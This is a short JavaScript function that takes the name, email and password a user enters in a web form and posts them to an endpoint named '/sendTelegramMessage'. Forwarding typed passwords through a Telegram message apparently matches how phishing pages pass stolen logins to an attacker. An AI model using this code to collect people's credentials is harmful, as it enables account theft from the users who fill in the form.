function sendMessage() {
  var name = document.getElementById("name").value;
  var email = document.getElementById("email").value;
  var password = document.getElementById("password").value;

  var formData = {
    name: name,
    email: email,
    password: password,
  };

  fetch("/sendTelegramMessage", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(formData),
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error("Failed to send message.");
      }
      return response.json();
    })
    .then((data) => {
      console.log("Message sent successfully:", data);
      // Optionally, display a success message to the user
    })
    .catch((error) => {
      console.error("Error sending message:", error);
      // Optionally, display an error message to the user
    });
}
